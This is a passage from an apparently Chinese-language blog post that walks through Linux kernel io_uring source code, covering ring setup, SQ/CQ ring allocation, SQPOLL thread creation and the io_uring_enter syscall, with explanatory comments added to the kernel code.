class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_MMAP))</span><br><span class="line">p-&gt;sq_off.user_addr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">p-&gt;cq_off.head = offsetof(<span class="keyword">struct</span> io_rings, cq.head);</span><br><span class="line">p-&gt;cq_off.tail = offsetof(<span class="keyword">struct</span> io_rings, cq.tail);</span><br><span class="line">p-&gt;cq_off.ring_mask = offsetof(<span class="keyword">struct</span> io_rings, cq_ring_mask);</span><br><span class="line">p-&gt;cq_off.ring_entries = offsetof(<span class="keyword">struct</span> io_rings, cq_ring_entries);</span><br><span class="line">p-&gt;cq_off.overflow = offsetof(<span class="keyword">struct</span> io_rings, cq_overflow);</span><br><span class="line">p-&gt;cq_off.cqes = offsetof(<span class="keyword">struct</span> io_rings, cqes);</span><br><span class="line">p-&gt;cq_off.flags = offsetof(<span class="keyword">struct</span> io_rings, cq_flags);</span><br><span class="line">p-&gt;cq_off.resv1 = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>设置feature</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;features = IORING_FEAT_SINGLE_MMAP | IORING_FEAT_NODROP |</span><br><span class="line">IORING_FEAT_SUBMIT_STABLE | IORING_FEAT_RW_CUR_POS |</span><br><span class="line">IORING_FEAT_CUR_PERSONALITY | IORING_FEAT_FAST_POLL |</span><br><span class="line">IORING_FEAT_POLL_32BITS | IORING_FEAT_SQPOLL_NONFIXED |</span><br><span class="line">IORING_FEAT_EXT_ARG | IORING_FEAT_NATIVE_WORKERS |</span><br><span class="line">IORING_FEAT_RSRC_TAGS | IORING_FEAT_CQE_SKIP |</span><br><span class="line">IORING_FEAT_LINKED_FILE | IORING_FEAT_REG_REG_RING;</span><br></pre></td></tr></table></figure><p>再将<code>params</code>复制回用户空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (copy_to_user(params, p, <span class="keyword">sizeof</span>(*p))) &#123;</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后是注册fd</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_SINGLE_ISSUER</span><br><span class="line">    &amp;&amp; !(ctx-&gt;flags &amp; IORING_SETUP_R_DISABLED))</span><br><span class="line">WRITE_ONCE(ctx-&gt;submitter_task, get_task_struct(current));</span><br><span class="line"></span><br><span class="line">file = io_uring_get_file(ctx);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(file)) &#123;</span><br><span class="line">ret = PTR_ERR(file);</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = __io_uring_add_tctx_node(ctx);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> err_fput;</span><br><span class="line">tctx = current-&gt;io_uring;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Install ring fd as the very last thing, so we don&#x27;t risk someone</span></span><br><span class="line"><span class="comment"> * having closed it before we finish setup</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_REGISTERED_FD_ONLY)</span><br><span class="line">ret = io_ring_add_registered_file(tctx, file, <span class="number">0</span>, IO_RINGFD_REG_MAX);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = io_uring_install_fd(file);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_fput;</span><br></pre></td></tr></table></figure><p>错误处理如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">err:</span><br><span class="line">io_ring_ctx_wait_and_kill(ctx);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">err_fput:</span><br><span class="line">fput(file);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br></pre></td></tr></table></figure><h4 id="io-allocate-scq-urings"><code>io_allocate_scq_urings</code></h4><p>首先是rings的分配，核心关键点在于NO_MMAP 的处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __cold <span class="type">int</span> <span class="title function_">io_allocate_scq_urings</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx,</span></span><br><span class="line"><span class="params"> <span class="keyword">struct</span> io_uring_params *p)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_rings</span> *<span class="title">rings</span>;</span></span><br><span class="line"><span class="type">size_t</span> size, sq_array_offset;</span><br><span class="line"><span class="type">void</span> *ptr;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* make sure these are sane, as we already accounted them */</span></span><br><span class="line">ctx-&gt;sq_entries = p-&gt;sq_entries;</span><br><span class="line">ctx-&gt;cq_entries = p-&gt;cq_entries;</span><br><span class="line"></span><br><span class="line">size = rings_size(ctx, p-&gt;sq_entries, p-&gt;cq_entries, &amp;sq_array_offset);</span><br><span class="line"><span class="keyword">if</span> (size == SIZE_MAX)</span><br><span class="line"><span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_MMAP))</span><br><span class="line">rings = io_mem_alloc(size);</span><br><span class="line"><span class="comment">// 如果没有设置NO_MMAP，就分配</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">rings = io_rings_map(ctx, p-&gt;cq_off.user_addr, size);</span><br><span class="line"><span class="comment">// 反之，建立映射</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(rings))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(rings);</span><br><span class="line"></span><br><span class="line">ctx-&gt;rings = rings;</span><br></pre></td></tr></table></figure><p>接下来是类似的，sqe的分配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_SQARRAY))</span><br><span class="line">ctx-&gt;sq_array = (u32 *)((<span class="type">char</span> *)rings + sq_array_offset);</span><br><span class="line">rings-&gt;sq_ring_mask = p-&gt;sq_entries - <span class="number">1</span>;</span><br><span class="line">rings-&gt;cq_ring_mask = p-&gt;cq_entries - <span class="number">1</span>;</span><br><span class="line">rings-&gt;sq_ring_entries = p-&gt;sq_entries;</span><br><span class="line">rings-&gt;cq_ring_entries = p-&gt;cq_entries;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_SQE128)</span><br><span class="line">size = array_size(<span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_sqe), p-&gt;sq_entries);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">size = array_size(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_sqe), p-&gt;sq_entries);</span><br><span class="line"><span class="keyword">if</span> (size == SIZE_MAX) &#123;</span><br><span class="line">io_rings_free(ctx);</span><br><span class="line"><span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_MMAP))</span><br><span class="line">ptr = io_mem_alloc(size);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ptr = io_sqes_map(ctx, p-&gt;sq_off.user_addr, size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(ptr)) &#123;</span><br><span class="line">io_rings_free(ctx);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(ptr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx-&gt;sq_sqes = ptr;</span><br></pre></td></tr></table></figure><h3 id="io-sq-offload-create"><code>io_sq_offload_create</code></h3><p>如果设置了 SQPOLL， 用来创建内核收割任务的线程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">__cold <span class="type">int</span> <span class="title function_">io_sq_offload_create</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> io_uring_params *p)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Retain compatibility with failing for an invalid attach attempt */</span></span><br><span class="line"><span class="keyword">if</span> ((ctx-&gt;flags &amp; (IORING_SETUP_ATTACH_WQ | IORING_SETUP_SQPOLL)) ==</span><br><span class="line">IORING_SETUP_ATTACH_WQ) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"></span><br><span class="line">f = fdget(p-&gt;wq_fd);</span><br><span class="line"><span class="keyword">if</span> (!f.file)</span><br><span class="line"><span class="keyword">return</span> -ENXIO;</span><br><span class="line"><span class="keyword">if</span> (!io_is_uring_fops(f.file)) &#123;</span><br><span class="line">fdput(f);</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line">fdput(f);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_SQPOLL) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_sq_data</span> *<span class="title">sqd</span>;</span></span><br><span class="line"><span class="type">bool</span> attached;</span><br><span class="line"></span><br><span class="line">ret = security_uring_sqpoll();</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">sqd = io_get_sq_data(p, &amp;attached);</span><br><span class="line"><span class="comment">// 获取一个sqd </span></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(sqd)) &#123;</span><br><span class="line">ret = PTR_ERR(sqd);</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx-&gt;sq_creds = get_current_cred();</span><br><span class="line">ctx-&gt;sq_data = sqd;</span><br><span class="line">ctx-&gt;sq_thread_idle = msecs_to_jiffies(p-&gt;sq_thread_idle);</span><br><span class="line"><span class="keyword">if</span> (!ctx-&gt;sq_thread_idle)</span><br><span class="line">ctx-&gt;sq_thread_idle = HZ;</span><br><span class="line"><span class="comment">// 设置相关信息</span></span><br><span class="line">io_sq_thread_park(sqd);</span><br><span class="line">list_add(&amp;ctx-&gt;sqd_list, &amp;sqd-&gt;ctx_list);</span><br><span class="line">io_sqd_update_thread_idle(sqd);</span><br><span class="line"><span class="comment">/* don&#x27;t attach to a dying SQPOLL thread, would be racy */</span></span><br><span class="line">ret = (attached &amp;&amp; !sqd-&gt;thread) ? -ENXIO : <span class="number">0</span>;</span><br><span class="line">io_sq_thread_unpark(sqd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line"><span class="keyword">if</span> (attached)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_SQ_AFF) &#123;</span><br><span class="line"><span class="type">int</span> cpu = p-&gt;sq_thread_cpu;</span><br><span class="line"></span><br><span class="line">ret = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (cpu &gt;= nr_cpu_ids || !cpu_online(cpu))</span><br><span class="line"><span class="keyword">goto</span> err_sqpoll;</span><br><span class="line">sqd-&gt;sq_cpu = cpu;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">sqd-&gt;sq_cpu = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sqd-&gt;task_pid = current-&gt;pid;</span><br><span class="line">sqd-&gt;task_tgid = current-&gt;tgid;</span><br><span class="line">tsk = create_io_thread(io_sq_thread, sqd, NUMA_NO_NODE);</span><br><span class="line"><span class="comment">// 创建处理线程</span></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(tsk)) &#123;</span><br><span class="line">ret = PTR_ERR(tsk);</span><br><span class="line"><span class="keyword">goto</span> err_sqpoll;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sqd-&gt;thread = tsk;</span><br><span class="line">ret = io_uring_alloc_task_context(tsk, ctx);</span><br><span class="line">wake_up_new_task(tsk);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_SQ_AFF) &#123;</span><br><span class="line"><span class="comment">/* Can&#x27;t have SQ_AFF without SQPOLL */</span></span><br><span class="line">ret = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err_sqpoll:</span><br><span class="line">complete(&amp;ctx-&gt;sq_data-&gt;exited);</span><br><span class="line">err:</span><br><span class="line">io_sq_thread_finish(ctx);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="io-uring-enter"><code>io_uring_enter</code></h3><p>首先是对于flag的检查和确认，这里不一一赘述了，感兴趣的去看相应的man page更能了解</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE6(io_uring_enter, <span class="type">unsigned</span> <span class="type">int</span>, fd, u32, to_submit,</span><br><span class="line">u32, min_complete, u32, flags, <span class="type">const</span> <span class="type">void</span> __user *, argp,</span><br><span class="line"><span class="type">size_t</span>, argsz)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_ring_ctx</span> *<span class="title">ctx</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"><span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(flags &amp; ~(IORING_ENTER_GETEVENTS | IORING_ENTER_SQ_WAKEUP |</span><br><span class="line">       IORING_ENTER_SQ_WAIT | IORING_ENTER_EXT_ARG |</span><br><span class="line">       IORING_ENTER_REGISTERED_RING)))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ring fd has been registered via IORING_REGISTER_RING_FDS, we</span></span><br><span class="line"><span class="comment"> * need only dereference our task private array to find it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; IORING_ENTER_REGISTERED_RING) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_task</span> *<span class="title">tctx</span> =</span> current-&gt;io_uring;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!tctx || fd &gt;= IO_RINGFD_REG_MAX))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">fd = array_index_nospec(fd, IO_RINGFD_REG_MAX);</span><br><span class="line">f.file = tctx-&gt;registered_rings[fd];</span><br><span class="line">f.flags = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!f.file))</span><br><span class="line"><span class="keyword">return</span> -EBADF;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">f = fdget(fd);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!f.file))</span><br><span class="line"><span class="keyword">return</span> -EBADF;</span><br><span class="line">ret = -EOPNOTSUPP;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!io_is_uring_fops(f.file)))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx = f.file-&gt;private_data;</span><br><span class="line">ret = -EBADFD;</span><br><span class="line"><span class="keyword">if</span> (unlikely(ctx-&gt;flags &amp; IORING_SETUP_R_DISABLED))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>SQPOLL模式下,直接返回提交数,可选择性wakeup线程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For SQ polling, the thread will do all submissions and completions.</span></span><br><span class="line"><span class="comment"> * Just return the requested submit count, and wake the thread if</span></span><br><span class="line"><span class="comment"> * we were asked to.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_SQPOLL) &#123;</span><br><span class="line">io_cqring_overflow_flush(ctx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(ctx-&gt;sq_data-&gt;thread == <span class="literal">NULL</span>)) &#123;</span><br><span class="line">ret = -EOWNERDEAD;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flags &amp; IORING_ENTER_SQ_WAKEUP)</span><br><span class="line"><span class="comment">// 这个flag处于和用户态共享的内存 </span></span><br><span class="line"><span class="comment">// 如果sq处理线程休眠了，并需要唤醒</span></span><br><span class="line"><span class="comment">// 可以通过设置 IORING_ENTER_SQ_WAKEUP， 再通过此syscall 来唤醒</span></span><br><span class="line">wake_up(&amp;ctx-&gt;sq_data-&gt;wait);</span><br><span class="line"><span class="keyword">if</span> (flags &amp; IORING_ENTER_SQ_WAIT)</span><br><span class="line">io_sqpoll_wait_sq(ctx);</span><br><span class="line"></span><br><span class="line">ret = to_submit;</span><br></pre></td></tr></table></figure><p>非SQPOLL模式,执行提交请求到SQ环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (to_submit) &#123;</span><br><span class="line">ret = io_uring_add_tctx_node(ctx);</span><br><span class="line"><span class="keyword">if</span> (unlikely(ret))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">mutex_lock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">ret = io_submit_sqes(ctx, to_submit);</span><br><span class="line"><span class="comment">// 直接提交 sqes </span></span><br><span class="line"><span class="comment">// 这个函数将在后面分析</span></span><br><span class="line"><span class="comment">// SQPOLL 模式下创建的io_sq_thread 也会调用此函数</span></span><br><span class="line"><span class="keyword">if</span> (ret != to_submit) &#123;</span><br><span class="line">mutex_unlock(&amp;ctx-&gt;uring_lock);</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flags &amp; IORING_ENTER_GETEVENTS) &#123;</span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;syscall_iopoll)</span><br><span class="line"><span class="keyword">goto</span> iopoll_locked;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ignore errors, we&#x27;ll soon call io_cqring_wait() and</span></span><br><span class="line"><span class="comment"> * it should handle ownership problems if any.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_DEFER_TASKRUN)</span><br><span class="line">(<span class="type">void</span>)io_run_local_work_locked(ctx);</span><br><span class="line">&#125;</span><br><span class="line">mutex_unlock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (flags &amp; IORING_ENTER_GETEVENTS) &#123;</span><br><span class="line"><span class="comment">// 如果请求获取完成事件</span></span><br><span class="line"><span class="type">int</span> ret2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;syscall_iopoll) &#123;</span><br><span class="line"><span class="comment">// 如果开启了syscall轮询模式,执行iopoll逻辑 </span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We disallow the app entering submit/complete with</span></span><br><span class="line"><span class="comment"> * polling, but we still need to lock the ring to</span></span><br><span class="line"><span class="comment"> * prevent racing with polled issue that got punted to</span></span><br><span class="line"><span class="comment"> * a workqueue.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mutex_lock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">iopoll_locked:</span><br><span class="line">ret2 = io_validate_ext_arg(flags, argp, argsz);</span><br><span class="line"><span class="keyword">if</span> (likely(!ret2)) &#123;</span><br><span class="line">min_complete = min(min_complete,</span><br><span class="line">   ctx-&gt;cq_entries);</span><br><span class="line">ret2 = io_iopoll_check(ctx, min_complete);</span><br><span class="line">&#125;</span><br><span class="line">mutex_unlock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">const</span> <span class="type">sigset_t</span> __user *sig;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">kernel_timespec</span> __<span class="title">user</span> *<span class="title">ts</span>;</span></span><br><span class="line"></span><br><span class="line">ret2 = io_get_ext_arg(flags, argp, &amp;argsz, &amp;ts, &amp;sig);</span><br><span class="line"><span class="keyword">if</span> (likely(!ret2)) &#123;</span><br><span class="line">min_complete = min(min_complete,</span><br><span class="line">   ctx-&gt;cq_entries);</span><br><span class="line">ret2 = io_cqring_wait(ctx, min_complete, sig,</span><br><span class="line">      argsz, ts);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ret) &#123;</span><br><span class="line">ret = ret2;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * EBADR indicates that one or more CQE were dropped.</span></span><br><span class="line"><span class="comment"> * Once the user has been informed we can clear the bit</span></span><br><span class="line"><span class="comment"> * as they are obviously ok with those drops.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span 